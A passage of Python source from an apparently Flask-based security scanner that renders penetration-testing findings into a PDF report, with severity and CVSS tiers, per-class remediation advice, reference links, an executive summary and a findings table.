    parts.append('=== IMPACT ===')
    impact_map = {
        'critical': ('CRITICAL', 'Full system compromise. Remote code execution or complete data breach. '
                      'No authentication required. Exploitation is trivial with public exploits.'),
        'high': ('HIGH', 'Significant data exposure or privilege escalation. Authentication bypass possible. '
                 'Low technical skill required. Direct impact on data confidentiality.'),
        'medium': ('MEDIUM', 'Limited data access or actions requiring user interaction. '
                   'Exploitation requires social engineering or specific conditions.'),
        'low': ('LOW', 'Minor information disclosure or best practice violation. '
                'Limited direct impact but aids attack chains.'),
        'info': ('INFO', 'Security observation. No direct exploitability. '
                 'Remediation recommended for defense-in-depth.'),
    }
    sev_label, sev_text = impact_map.get(sev, ('INFO', 'Impact assessment based on severity.'))
    parts.append(f'{sev_label}: {sev_text}')
    parts.append('')

    # ═══════════════════════════════════════════════════════════════════════════
    # SECTION 5: RISK ASSESSMENT
    # ═══════════════════════════════════════════════════════════════════════════
    parts.append('=== RISK ASSESSMENT ===')
    cv_val = float(cvss) if cvss and str(cvss).replace('.', '').isdigit() else 0
    if cv_val >= 9:
        parts.append(f'CVSS {cvss} — CRITICAL RISK')
        parts.append(f'Exploitation: Remotely exploitable without authentication')
        parts.append(f'Remediation: Immediate — within 24 hours')
        parts.append(f'Business Impact: Full system compromise, data breach, regulatory penalties')
    elif cv_val >= 7:
        parts.append(f'CVSS {cvss} — HIGH RISK')
        parts.append(f'Exploitation: Requires low skill, publicly available exploits')
        parts.append(f'Remediation: Within 7 days')
        parts.append(f'Business Impact: Significant data exposure, compliance violations')
    elif cv_val >= 4:
        parts.append(f'CVSS {cvss} — MEDIUM RISK')
        parts.append(f'Exploitation: Requires specific conditions or user interaction')
        parts.append(f'Remediation: Within 30 days')
        parts.append(f'Business Impact: Limited data access, operational disruption')
    else:
        parts.append(f'CVSS {cvss or "N/A"} — LOW/INFO')
        parts.append(f'Exploitation: Limited or no direct exploitation path')
        parts.append(f'Remediation: Regular maintenance cycle')
        parts.append(f'Business Impact: Minor, contributes to overall attack surface')
    parts.append('')

    # ═══════════════════════════════════════════════════════════════════════════
    # SECTION 6: REMEDIATION
    # ═══════════════════════════════════════════════════════════════════════════
    parts.append('=== REMEDIATION ===')
    if 'sqli' in title or 'sql injection' in title:
        parts.append('1. Use parameterized queries / prepared statements — never concatenate user input')
        parts.append('2. Implement input validation with allowlists')
        parts.append('3. Apply principle of least privilege to database accounts')
        parts.append('4. Deploy a Web Application Firewall (WAF) as defense-in-depth')
        parts.append('5. Conduct code review for all database queries')
    elif 'xss' in title or 'cross-site' in title:
        parts.append('1. Implement context-aware output encoding (HTML, JS, URL, CSS)')
        parts.append('2. Deploy Content-Security-Policy (CSP) header')
        parts.append('3. Use HTTPOnly and Secure flags on session cookies')
        parts.append('4. Validate and sanitize all user input on both client and server')
        parts.append('5. Use modern frameworks that auto-escape by default (React, Vue, Django)')
    elif 'ssrf' in title:
        parts.append('1. Validate and sanitize all user-supplied URLs')
        parts.append('2. Use allowlists for permitted domains/IPs')
        parts.append('3. Block access to internal IP ranges (127.0.0.1, 169.254.0.0/16, 10.0.0.0/8)')
        parts.append('4. Use IMDSv2 (requires session token) to protect cloud metadata')
        parts.append('5. Disable unnecessary URL-fetching features')
    elif 'secret' in title or 'credential' in title:
        parts.append('1. Rotate the exposed secret immediately')
        parts.append('2. Use environment variables or secret managers (Vault, AWS Secrets Manager)')
        parts.append('3. Remove from source code and git history')
        parts.append('4. Implement pre-commit hooks to prevent future leaks (gitleaks, git-secrets)')
        parts.append('5. Audit access logs for unauthorized usage')
    elif 'header' in title or 'missing' in title:
        parts.append('1. Add the missing security header to your web server/framework configuration')
        parts.append('2. Use the recommended header values (see OWASP Secure Headers Project)')
        parts.append('3. Test with: curl -I https://target.com | grep -i "<header-name>"')
        parts.append('4. Consider using a framework that sets security headers by default')
    elif 'crlf' in title:
        parts.append('1. Sanitize all user input — remove \\r\\n characters')
        parts.append('2. Encode output before inserting into HTTP headers')
        parts.append('3. Use framework-provided header-setting functions')
        parts.append('4. Validate Content-Type and other headers on responses')
    elif 'cors' in title:
        parts.append('1. Never reflect arbitrary Origin headers')
        parts.append('2. Use a strict allowlist of permitted origins')
        parts.append('3. Only set Access-Control-Allow-Credentials: true for trusted origins')
        parts.append('4. Avoid using Access-Control-Allow-Origin: * with credentials')
    elif 'port' in title or 'open' in title:
        parts.append('1. Close unnecessary ports or restrict with firewall rules')
        parts.append('2. Implement network segmentation')
        parts.append('3. Use intrusion detection systems (IDS) to monitor port scans')
        parts.append('4. Regularly audit exposed services')
    else:
        parts.append('1. Address the vulnerability based on the evidence captured above')
        parts.append('2. Follow OWASP guidelines for the specific vulnerability class')
        parts.append('3. Implement defense-in-depth: WAF, CSP, input validation')
        parts.append('4. Conduct a follow-up scan to verify remediation')
    parts.append('')

    # ═══════════════════════════════════════════════════════════════════════════
    # SECTION 7: REFERENCES
    # ═══════════════════════════════════════════════════════════════════════════
    parts.append('=== REFERENCES ===')
    if cve and cve.startswith('CVE-'):
        parts.append(f'NVD: https://nvd.nist.gov/vuln/detail/{cve}')
        parts.append(f'MITRE: https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}')
        parts.append(f'CVE Details: https://www.cvedetails.com/cve/{cve}/')
    if owasp:
        parts.append(f'OWASP: https://owasp.org/Top10/{owasp}/')
    if mitre:
        parts.append(f'MITRE ATT&CK: https://attack.mitre.org/techniques/{mitre}/')
    if poc and not poc.startswith('#'):
        parts.append(f'Exploit/Reference: {poc}')
    if exploit and exploit not in ('INFO', 'PUBLIC', ''):
        parts.append(f'Exploit Availability: {exploit}')

    return parts


@pdf_bp.route('/api/export/pdf', methods=['GET', 'POST'])
@login_required
def export_pdf():
    try:
        target = scan_state['target'] or 'unknown.com'
        with LOCK:
            state_copy = json.loads(json.dumps(scan_state))

        if not FPDF_AVAILABLE:
            return jsonify({'status': 'error', 'message': 'fpdf2 not installed. Run: pip install fpdf2'}), 400

        findings = state_copy.get('findings', [])
        if not findings:
            findings = state_copy.get('scan_state', {}).get('findings', [])
        if not findings:
            for key in state_copy.keys():
                if isinstance(state_copy[key], dict) and 'findings' in state_copy[key]:
                    findings = state_copy[key]['findings']
                    break
        # Sort findings by severity (Critical -> Info)
        sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
        findings = sorted(
            findings,
            key=lambda f: (sev_order.get((f.get('sev') or 'info').lower(), 4), -float(f.get('cvss') or 0) if str(f.get('cvss', '')).replace('.', '').isdigit() else 0)
        )
        state_copy['findings'] = findings

        pdf = FPDF()
        sev_colors = {'critical': (227, 30, 36), 'high': (234, 88, 12), 'medium': (202, 138, 4), 'low': (22, 163, 74), 'info': (37, 99, 235)}

        def safe_text(text):
            """Sanitize text for FPDF latin-1 encoding"""
            if not text:
                return ''
            text = str(text)
            replacements = {
                '—': '-',   # em dash
                '–': '-',   # en dash
                '‘': "'",   # left single quote
                '’': "'",   # right single quote
                '“': '"',   # left double quote
                '”': '"',   # right double quote
                '…': '...',  # ellipsis
                '•': '-',   # bullet
                ' ': ' ',   # non-breaking space
                '→': '->',  # right arrow
                '←': '<-',  # left arrow
                '↑': '^',   # up arrow
                '↓': 'v',   # down arrow
                '⇒': '=>',  # double right arrow
                '⇐': '<=',  # double left arrow
                '≤': '<=',  # less than or equal
                '≥': '>=',  # greater than or equal
                '≠': '!=',  # not equal
                '≈': '~',   # approximately
                '×': 'x',   # multiplication
                '÷': '/',   # division
                '°': 'deg', # degree
                '±': '+/-', # plus-minus
                '®': '(R)', # registered
                '™': '(TM)',# trademark
                '©': '(C)', # copyright
                '€': 'EUR', # euro
                '£': 'GBP', # pound
                '¥': 'JPY', # yen
                '●': '*',   # filled circle
                '○': 'o',   # empty circle
                '■': '#',   # filled square
                '□': '[]',  # empty square
                '✓': '[v]', # checkmark
                '✗': '[x]', # cross mark
                '⚠': '[!]', # warning sign
                '⭐': '[*]', # star
                '«': '<<',  # left guillemet
                '»': '>>',  # right guillemet
                '‹': '<',   # single left guillemet
                '›': '>',   # single right guillemet
                '‐': '-',   # hyphen
                '‑': '-',   # non-breaking hyphen
                '‒': '-',   # figure dash
                '―': '--',  # horizontal bar
                '­': '-',   # soft hyphen
                '​': '',    # zero-width space
                '‌': '',    # zero-width non-joiner
                '‍': '',    # zero-width joiner
                '﻿': '',    # BOM
                ' ': '\n',  # line separator
                ' ': '\n',  # paragraph separator
            }
            for k, v in replacements.items():
                text = text.replace(k, v)
            # Remove any remaining non-latin1 characters
            return text.encode('latin-1', errors='replace').decode('latin-1')

        def section_header(title, num):
            pdf.add_page()
            pdf.set_fill_color(30, 30, 40)
            pdf.rect(0, 0, 210, 18, 'F')
            pdf.set_text_color(255, 255, 255)
            pdf.set_font('Helvetica', 'B', 14)
            pdf.set_y(4)
            pdf.cell(0, 10, safe_text(f'{num}. {title}'), new_x='LMARGIN', new_y='NEXT', align='C')
            pdf.ln(12)

        def add_text(text, size=9, bold=False, color=(24, 24, 27), indent=0):
            pdf.set_x(10 + indent)
            pdf.set_text_color(*color)
            pdf.set_font('Helvetica', 'B' if bold else '', size)
            pdf.multi_cell(190 - indent, 5, safe_text(text))
            pdf.ln(1)

        def draw_line(y_pos=None):
            if y_pos is None:
                y_pos = pdf.get_y()
            pdf.set_draw_color(200, 200, 210)
            pdf.set_line_width(0.3)
            pdf.line(10, y_pos, 200, y_pos)

        # ─── COVER PAGE ───
        pdf.add_page()
        pdf.set_fill_color(30, 30, 40)
        pdf.rect(0, 0, 210, 8, 'F')
        pdf.set_fill_color(30, 30, 40)
        pdf.rect(0, 40, 210, 80, 'F')
        pdf.set_text_color(255, 255, 255)
        pdf.set_font('Helvetica', 'B', 32)
        pdf.set_y(55)
        pdf.cell(0, 15, 'SECURITY ASSESSMENT', new_x='LMARGIN', new_y='NEXT', align='C')
        pdf.set_font('Helvetica', '', 16)
        pdf.cell(0, 10, 'Penetration Testing Report', new_x='LMARGIN', new_y='NEXT', align='C')
        pdf.set_draw_color(227, 30, 36)
        pdf.set_line_width(1)
        pdf.line(60, pdf.get_y() + 5, 150, pdf.get_y() + 5)
        pdf.ln(15)
        pdf.set_fill_color(245, 245, 248)
        pdf.rect(30, pdf.get_y(), 150, 45, 'F')
        info_y = pdf.get_y() + 8
        pdf.set_text_color(60, 60, 70)
        pdf.set_font('Helvetica', '', 11)
        pdf.set_y(info_y)
        pdf.set_x(40)
        pdf.cell(40, 7, 'Target:', new_x='RIGHT')
        pdf.set_font('Helvetica', 'B', 11)
        pdf.cell(100, 7, safe_text(target), new_x='LMARGIN', new_y='NEXT')
        pdf.set_font('Helvetica', '', 11)
        pdf.set_x(40)
        pdf.cell(40, 7, 'Date:', new_x='RIGHT')
        pdf.cell(100, 7, datetime.now().strftime("%B %d, %Y at %H:%M"), new_x='LMARGIN', new_y='NEXT')
        pdf.set_x(40)
        pdf.cell(40, 7, 'Classification:', new_x='RIGHT')
        pdf.set_text_color(227, 30, 36)
        pdf.set_font('Helvetica', 'B', 11)
        pdf.cell(100, 7, 'CONFIDENTIAL', new_x='LMARGIN', new_y='NEXT')
        pdf.set_y(180)
        pdf.set_text_color(120, 120, 130)
        pdf.set_font('Helvetica', '', 9)
        pdf.cell(0, 6, 'This document contains sensitive security information.', new_x='LMARGIN', new_y='NEXT', align='C')
        pdf.cell(0, 6, 'Distribution is restricted to authorized personnel only.', new_x='LMARGIN', new_y='NEXT', align='C')
        pdf.set_fill_color(30, 30, 40)
        pdf.rect(0, 289, 210, 8, 'F')

        # ─── TABLE OF CONTENTS ───
        pdf.add_page()
        pdf.set_fill_color(30, 30, 40)
        pdf.rect(0, 0, 210, 18, 'F')
        pdf.set_text_color(255, 255, 255)
        pdf.set_font('Helvetica', 'B', 14)
        pdf.set_y(4)
        pdf.cell(0, 10, 'TABLE OF CONTENTS', new_x='LMARGIN', new_y='NEXT', align='C')
        pdf.ln(20)
        toc = [
            ('1', 'Executive Summary', 'Overview and key findings'),
            ('2', 'Risk Score & Analysis', 'Detailed risk breakdown'),
            ('3', 'Vulnerability Findings', 'Complete findings table'),
            ('4', 'Detailed Findings', 'Remediation & PoC for each finding'),
            ('5', 'Security Headers', 'Missing headers analysis'),
            ('6', 'Open Ports', 'Network services discovered'),
            ('7', 'Recommendations', 'Prioritized action items')
        ]
        for num, title, desc in toc:
            pdf.set_fill_color(245, 245, 248)
            pdf.rect(15, pdf.get_y(), 180, 14, 'F')
            pdf.set_text_color(30, 30, 40)
            pdf.set_font('Helvetica', 'B', 12)
            pdf.set_x(20)
            pdf.cell(10, 14, num, new_x='RIGHT')
            pdf.set_font('Helvetica', 'B', 11)
            pdf.cell(80, 14, safe_text(title), new_x='RIGHT')
            pdf.set_text_color(120, 120, 130)
            pdf.set_font('Helvetica', '', 9)
            pdf.cell(80, 14, safe_text(desc), new_x='LMARGIN', new_y='NEXT')
            pdf.ln(2)

        # ─── SECTION 1: EXECUTIVE SUMMARY ───
        section_header('EXECUTIVE SUMMARY', 1)
        stats = state_copy.get('stats', {})
        score = state_copy.get('risk_score', 0)
        risk_label = 'CRITICAL' if score >= 80 else 'HIGH' if score >= 60 else 'MEDIUM' if score >= 40 else 'LOW'
        total = len(findings)
        critical_cnt = stats.get('critical', 0)
        high_cnt = stats.get('high', 0)
        medium_cnt = stats.get('medium', 0)
        low_cnt = stats.get('low', 0)
        scan_start = state_copy.get('scan_start_time', 0)
        scan_end = state_copy.get('scan_end_time', time.time())
        duration = scan_end - scan_start if scan_start else 0
        duration_str = f'{int(duration//60)}m {int(duration%60)}s' if duration > 60 else f'{int(duration)}s'
        tools_used = []
        tool_checks = [
            ('nmap', 'Nmap'), ('sqlmap', 'SQLMap'), ('ffuf', 'FFUF'), ('nuclei', 'Nuclei'),
            ('httpx', 'httpx'), ('subfinder', 'Subfinder'), ('amass', 'Amass'),
            ('gau', 'gau'), ('katana', 'Katana'), ('testssl', 'testssl.sh'),
            ('sslyze', 'SSLYZE'), ('wafw00f', 'wafw00f'), ('dalfox', 'Dalfox'),
            ('osv-scanner', 'osv-scanner'), ('gitleaks', 'Gitleaks'),
            ('semgrep', 'Semgrep'), ('crlfuzz', 'crlfuzz'), ('trufflehog', 'TruffleHog'),
        ]
        for tool_key, tool_name in tool_checks:
            if _find_tool(tool_key):
                tools_used.append(tool_name)
        add_text(f'Target: {target}', 11, True)
        add_text(f'Scan Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', 10)
        add_text(f'Scan Duration: {duration_str} | Tools Used: {len(tools_used)}', 10)
        pdf.ln(3)
        add_text('OVERVIEW', 10, True, (227, 30, 36))
        add_text(f'This report presents the results of a comprehensive automated security assessment '
                 f'performed against {target} using {len(tools_used)} integrated security tools across '
                 f'{len(state_copy.get("modules_run", []))} scan modules. The assessment identified '
                 f'{total} security findings spanning network services, web application security, '
                 f'SSL/TLS configuration, security headers, dependency vulnerabilities, secrets exposure, '
                 f'SAST analysis, and advanced XSS/CRLF injection testing.', 9)
        pdf.ln(2)
        add_text('TOOLS USED IN THIS ASSESSMENT', 10, True, (227, 30, 36))
        tools_text = ', '.join(tools_used[:10])
        if len(tools_used) > 10:
            tools_text += f', and {len(tools_used)-10} more'
        add_text(tools_text, 9)
        pdf.ln(2)
        add_text('KEY FINDINGS', 10, True, (227, 30, 36))
        add_text(f'Overall Risk Score: {score}/100 ({risk_label})', 9)
        add_text(f'Total Vulnerabilities: {total}', 9)
        add_text(f'Critical: {critical_cnt} | High: {high_cnt} | Medium: {medium_cnt} | Low: {low_cnt}', 9)
        if critical_cnt > 0:
            add_text(f'URGENT: {critical_cnt} critical vulnerabilities require immediate attention within 24 hours.', 9, True, (227, 30, 36))
        if high_cnt > 0:
            add_text(f'WARNING: {high_cnt} high-severity vulnerabilities should be remediated within 1 week.', 9, True, (234, 88, 12))
        pdf.ln(2)
        add_text('TOP VULNERABILITIES', 10, True, (227, 30, 36))
        top_findings = sorted(findings, key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}.get(x.get('sev', 'info'), 5))[:5]
        for i, tf in enumerate(top_findings):
            sev_tag = tf.get('sev', 'info').upper()
            sev_c = sev_colors.get(tf.get('sev', 'info'), (113, 113, 122))
            add_text(f'{i+1}. [{sev_tag}] {tf.get("title", "N/A")}', 9, True, sev_c)
            if tf.get('sub'):
                add_text(f'   {tf.get("sub", "")[:120]}', 8)
        pdf.ln(2)
        add_text('BUSINESS IMPACT', 10, True, (227, 30, 36))
        if risk_label == 'CRITICAL':
            add_text('The target has a CRITICAL risk posture. Immediate action is required to prevent potential data breaches, '
                     'service disruption, or compliance violations. The organization faces significant exposure to cyber threats.', 9)
        elif risk_label == 'HIGH':
            add_text('The target has a HIGH risk posture. Prompt remediation is recommended to reduce the attack surface and '
                     'prevent potential exploitation. The organization should prioritize fixing critical and high severity findings.', 9)
        elif risk_label == 'MEDIUM':
            add_text('The target has a MEDIUM risk posture. While not immediately critical, the identified vulnerabilities '
                     'should be addressed in a timely manner to maintain a strong security posture.', 9)
        else:
            add_text('The target has a LOW risk posture. The identified issues are mostly informational and should be '
                     'addressed during regular maintenance cycles.', 9)

        # ─── SECTION 2: RISK SCORE ───
        section_header('RISK SCORE & ANALYSIS', 2)
        risk_colors = {'CRITICAL': (227, 30, 36), 'HIGH': (234, 88, 12), 'MEDIUM': (202, 138, 4), 'LOW': (22, 163, 74)}
        rc = risk_colors.get(risk_label, (113, 113, 122))
        add_text(f'Overall Risk Score: {score}/100 ({risk_label})', 12, True, rc)
        pdf.set_fill_color(*rc)
        pdf.rect(10, pdf.get_y(), score * 1.9, 8, 'F')
        pdf.ln(12)
        add_text('SEVERITY DISTRIBUTION', 10, True, (227, 30, 36))
        col_x = [10, 58, 106, 154]
        base_y = pdf.get_y()
        for i, (lbl, key, clr) in enumerate([('CRITICAL', 'critical', (227, 30, 36)), ('HIGH', 'high', (234, 88, 12)), ('MEDIUM', 'medium', (202, 138, 4)), ('LOW', 'low', (22, 163, 74))]):
            pdf.set_fill_color(*clr)
            pdf.set_xy(col_x[i], base_y)
            pdf.cell(44, 20, '', border=0, fill=True)
            pdf.set_xy(col_x[i], base_y + 3)
            pdf.set_text_color(255, 255, 255)
            pdf.set_font('Helvetica', 'B', 18)
            pdf.cell(44, 10, str(stats.get(key, 0)), align='C')
            pdf.set_xy(col_x[i], base_y + 13)
            pdf.set_font('Helvetica', '', 7)
            pdf.cell(44, 5, lbl, align='C')
        pdf.set_y(base_y + 26)
        add_text('RISK FACTOR BREAKDOWN', 10, True, (227, 30, 36))
        breakdown = state_copy.get('risk_breakdown', [])
        if breakdown:
            pdf.set_font('Helvetica', 'B', 8)
            pdf.set_fill_color(30, 30, 40)
            pdf.set_text_color(255, 255, 255)
            pdf.cell(150, 7, '  Factor', border=0, fill=True)
            pdf.cell(30, 7, 'Points', border=0, align='C', fill=True)
            pdf.ln()
            pdf.set_text_color(24, 24, 27)
            pdf.set_font('Helvetica', '', 8)
            for row_idx, b in enumerate(breakdown[:15]):
                if row_idx % 2 == 0:
                    pdf.set_fill_color(248, 248, 250)
                else:
                    pdf.set_fill_color(255, 255, 255)
                row_y = pdf.get_y()
                pdf.rect(10, row_y, 190, 5, 'F')
                pdf.cell(150, 5, f'  {b["factor"][:85]}', border=0)
                pdf.set_text_color(227, 30, 36)
                pdf.set_font('Helvetica', 'B', 8)
                pdf.cell(30, 5, f"+{b['points']}", border=0, align='C')
                pdf.set_text_color(24, 24, 27)
                pdf.set_font('Helvetica', '', 8)
                pdf.ln()

        # ─── SECTION 3: ASSESSMENT METHODOLOGY ───
        section_header('ASSESSMENT METHODOLOGY', 3)
        add_text('The security assessment was conducted following industry-standard penetration testing methodologies '
                 'aligned with OWASP Testing Guide v4.2, PTES (Penetration Testing Execution Standard), and '
                 'NIST SP 800-115 (Technical Guide to Information Security Testing and Assessment). '
                 'Testing was performed using a combination of automated scanning tools and manual validation '
                 'techniques to identify, verify, and assess the impact of each finding.', 9)
        pdf.ln(3)
        add_text('PRE-AUTHENTICATION TESTING', 10, True, (227, 30, 36))
        pdf.ln(1)
        add_text('The assessment began with unauthenticated testing to identify vulnerabilities accessible to '
                 'external attackers without valid credentials.', 9)
        pdf.ln(2)
        pre_auth_items = [
            'Enumeration of publicly accessible endpoints and functionality.',
            'Analysis of application responses for information disclosure (server versions, stack traces, internal paths).',
            'Validation of input handling across all user-controlled parameters (URL, POST body, headers, cookies).',
            'Assessment of authentication-related workflows (login, registration, password reset).',
            'Identification of exposed administrative interfaces and sensitive resources (.env, .git, /admin).',
            'Verification of security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options).',
            'Testing for common web vulnerabilities affecting unauthenticated users (SQLi, XSS, SSRF, open redirects).',
            'Assessment of SSL/TLS configuration, certificate validity, and cipher suite strength.',
            'DNS enumeration for subdomain takeover, zone transfer, and wildcard DNS issues.',
            'Cloud storage exposure testing (S3 buckets, Azure Blobs, GCP Storage).',
        ]
        for i, item in enumerate(pre_auth_items, 1):
            if pdf.get_y() > 270:
                pdf.add_page()
            add_text(f'{i}. {item}', 8, indent=4)
        pdf.ln(3)

        # ─── SECTION 4: FINDINGS OVERVIEW TABLE ───
        section_header('VULNERABILITY FINDINGS OVERVIEW', 4)
        if findings:
            finding_links = []
            for fi in range(len(findings)):
                link = pdf.add_link()
                finding_links.append(link)
            col_w = [14, 50, 22, 22, 16, 20, 20, 26, 14]
            headers_list = ['Sev', 'Finding', 'CVE', 'Asset', 'CVSS', 'OWASP', 'MITRE', 'Exploit', 'Conf']
            pdf.set_font('Helvetica', 'B', 7)
            pdf.set_fill_color(30, 30, 40)
            pdf.set_text_color(255, 255, 255)
            for i, h in enumerate(headers_list):
                pdf.cell(col_w[i], 7, h, border=0, align='C', fill=True)
            pdf.ln()
            conf_colors = {'high': (180, 0, 0), 'medium': (180, 130, 0), 'speculative': (40, 80, 160)}
            for row_idx, f in enumerate(findings):
                sev = f.get('sev', 'info')
                c = sev_colors.get(sev, (113, 113, 122))
                if row_idx % 2 == 0:
                    pdf.set_fill_color(248, 248, 250)
                else:
                    pdf.set_fill_color(255, 255, 255)
                row_y = pdf.get_y()
                pdf.rect(10, row_y, 190, 6, 'F')
                pdf.set_text_color(*c)
                pdf.set_font('Helvetica', 'B', 7)
                pdf.cell(col_w[0], 6, safe_text(sev.upper()[:4]), border=0, align='C')
                pdf.set_text_color(24, 24, 27)
                pdf.set_font('Helvetica', '', 7)
                title_text = safe_text(f.get('title', '')[:40])
                link_idx = row_idx
                if link_idx < len(finding_links):
                    pdf.cell(col_w[1], 6, title_text, border=0, link=finding_links[link_idx])
                else:
                    pdf.cell(col_w[1], 6, title_text, border=0)
                pdf.cell(col_w[2], 6, safe_text((f.get('cve', '') or '')[:10]), border=0, align='C')
                asset_text = safe_text(f.get('asset', '')[:16])
                pdf.cell(col_w[3], 6, asset_text, border=0)
                pdf.cell(col_w[4], 6, safe_text(str(f.get('cvss', '') or '')), border=0, align='C')
                pdf.set_text_color(59, 130, 246)
                owasp_text = safe_text((f.get('owasp', '') or '')[:8])
                pdf.cell(col_w[5], 6, owasp_text, border=0, align='C')
                pdf.set_text_color(139, 92, 246)
                mitre_text = safe_text((f.get('mitre', '') or '')[:8])
                pdf.cell(col_w[6], 6, mitre_text, border=0, align='C')
                pdf.set_text_color(24, 24, 27)
                pdf.cell(col_w[7], 6, safe_text((f.get('exploit', '') or '')[:12]), border=0, align='C')
                conf = f.get('confidence', 'medium')
                conf_color = conf_colors.get(conf, conf_colors['medium'])
                pdf.set_fill_color(*conf_color)
                pdf.set_text_color(255, 255, 255)
                pdf.set_font('Helvetica', 'B', 7)
                pdf.cell(col_w[8], 6, conf[0].upper(), border=0, fill=True, align='C')
                pdf.set_text_color(24, 24, 27)
                pdf.ln()
        else:
            add_text('No findings discovered during scan.', 10)

        # ─── SECTION 5: DETAILED FINDINGS WITH REMEDIATION & POC ───
        if findings:
            section_header('DETAILED FINDINGS WITH REMEDIATION & POC', 5)
            add_text('Each finding below includes: actual evidence captured during the scan, '
                     'step-by-step reproduction instructions, impact analysis, risk assessment '
                     'with CVSS scoring, and specific remediation guidance.', 9)
            pdf.ln(3)
            sorted_findings = sorted(findings, key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}.get(x.get('sev', 'info'), 5))
            detail_links = []
            for fi in range(len(sorted_findings)):
                detail_links.append(pdf.add_link())
            for idx, f in enumerate(sorted_findings):
                sev = f.get('sev', 'info')
                c = sev_colors.get(sev, (113, 113, 122))
                if pdf.get_y() > 160:
                    pdf.add_page()
                if idx < len(detail_links):
                    pdf.set_link(detail_links[idx], y=-1, page=-1)
                pdf.set_x(14)
                pdf.set_text_color(30, 30, 40)
                pdf.set_font('Helvetica', 'B', 11)
                pdf.cell(150, 7, safe_text(f'Finding #{idx+1}: {f.get("title", "")}'))
                pdf.set_font('Helvetica', 'B', 10)
                pdf.set_text_color(*c)
                pdf.cell(32, 7, f'[{sev.upper()}]', align='R')
                pdf.ln(8)
                sub_text = f.get('sub', '')
                if sub_text:
                    pdf.set_x(14)
                    pdf.set_font('Helvetica', 'I', 8)
                    pdf.set_text_color(80, 80, 90)
                    pdf.multi_cell(180, 4, safe_text(sub_text[:180]))
                    pdf.ln(2)
                pdf.set_draw_color(*c)
                pdf.set_line_width(0.5)
                pdf.line(14, pdf.get_y(), 196, pdf.get_y())
                pdf.ln(4)
                cve_val = safe_text(f.get('cve', '') or 'N/A')
                cvss_val = safe_text(str(f.get('cvss', '') or 'N/A'))
                asset_val = safe_text(f.get('asset', '') or 'N/A')
                exploit_val = safe_text(f.get('exploit', '') or 'N/A')
                owasp_val = safe_text(f.get('owasp', '') or 'N/A')
                mitre_val = safe_text(f.get('mitre', '') or 'N/A')
                my = pdf.get_y()
                pdf.set_fill_color(248, 248, 250)
                pdf.rect(14, my, 182, 18, 'F')
                pdf.set_xy(16, my + 1)
                pdf.set_text_color(100, 100, 110)
                pdf.set_font('Helvetica', '', 8)
                pdf.cell(18, 5, 'CVE:')
                pdf.set_text_color(30, 30, 40)
                pdf.set_font('Helvetica', 'B', 8)
                pdf.cell(73, 5, cve_val)
                pdf.set_text_color(100, 100, 110)
                pdf.set_font('Helvetica', '', 8)
                pdf.cell(20, 5, 'CVSS:')
                pdf.set_text_color(30, 30, 40)
                pdf.set_font('Helvetica', 'B', 8)
                pdf.cell(70, 5, cvss_val)
                cvss_vector = f.get('cvss_vector', '')
                if cvss_vector:
                    pdf.set_text_color(120, 120, 130)
                    pdf.set_font('Helvetica', '', 6)
                    pdf.cell(0, 4, f'    Vector: {safe_text(cvss_vector[:80])}', new_x='LMARGIN', new_y='NEXT')
                else:
                    pdf.ln(5)
                pdf.set_xy(16, my + 7)
                pdf.set_text_color(100, 100, 110)
                pdf.set_font('Helvetica', '', 8)
                pdf.cell(18, 5, 'Asset:')
                pdf.set_text_color(30, 30, 40)
                pdf.set_font('Helvetica', 'B', 8)
                pdf.cell(73, 5, asset_val[:45])
                pdf.set_text_color(100, 100, 110)
                pdf.set_font('Helvetica', '', 8)
                pdf.cell(20, 5, 'OWASP:')
                pdf.set_text_color(59, 130, 246)
                pdf.set_font('Helvetica', 'B', 8)
                pdf.cell(70, 5, owasp_val)
                pdf.set_y(my + 20)

                # ── Render PoC sections ──
                poc_items = build_poc_section(f)
                section_bar_color = (60, 60, 70)
                for pi in poc_items:
                    text = safe_text(pi)
                    if text.startswith('=== ') and text.endswith(' ==='):
                        section_name = text.replace('=== ', '').replace(' ===', '').strip()
                        if pdf.get_y() > 262:
                            pdf.add_page()
                        pdf.ln(2)
                        pdf.set_fill_color(*section_bar_color)
                        pdf.rect(14, pdf.get_y(), 182, 5.5, 'F')
                        pdf.set_text_color(255, 255, 255)
                        pdf.set_font('Helvetica', 'B', 7.5)
                        pdf.set_x(16)
                        pdf.cell(178, 5, section_name, align='L')
                        pdf.set_y(pdf.get_y() + 7)
                        continue
                    if not text.strip():
                        continue
                    if pdf.get_y() > 270:
                        pdf.add_page()
                    pdf.set_text_color(40, 40, 50)
                    pdf.set_font('Helvetica', '', 7.5)
                    if text.startswith('  GET ') or text.startswith('  POST ') or text.startswith('  PUT ') or text.startswith('  DELETE ') or text.startswith('  curl ') or text.startswith('  $ '):
                        pdf.set_x(16)
                        pdf.set_font('Courier', '', 7)
                        pdf.set_text_color(30, 30, 40)
                        iy = pdf.get_y()
                        pdf.set_fill_color(245, 245, 248)
                        pdf.rect(16, iy, 176, 4.2, 'F')
                        pdf.set_x(18)
                        pdf.multi_cell(172, 4.2, text)
                    elif text.startswith('  Response:') or text.startswith('  < HTTP/') or text.startswith('  [INFO]') or text.startswith('  [*]'):
                        pdf.set_x(16)
                        pdf.set_font('Courier', '', 7)
                        pdf.set_text_color(60, 60, 70)
                        iy = pdf.get_y()
                        pdf.set_fill_color(245, 245, 248)
                        pdf.rect(16, iy, 176, 4.2, 'F')
                        pdf.set_x(18)
                        pdf.multi_cell(172, 4.2, text)
                    elif text.startswith('  Host:') or text.startswith('  User-Agent:') or text.startswith('  Accept:') or text.startswith('  Authorization:') or text.startswith('  Cookie:') or text.startswith('  Set-Cookie:') or text.startswith('  Content-Type:') or text.startswith('  Access-Control'):
                        pdf.set_x(16)
                        pdf.set_font('Courier', '', 7)
                        pdf.set_text_color(80, 80, 90)
                        pdf.set_x(18)
                        pdf.multi_cell(172, 4, text)
                    elif text.startswith('  Observation:') or text.startswith('  Observations:'):
                        pdf.set_x(16)
                        pdf.set_font('Helvetica', 'BI', 7.5)
                        pdf.set_text_color(22, 163, 74)
                        pdf.multi_cell(178, 4.5, text.strip())
                    elif text.strip() and text.strip()[0].isdigit() and '. ' in text[:5]:
                        pdf.set_x(16)
                        num_part = text.strip().split('. ', 1)
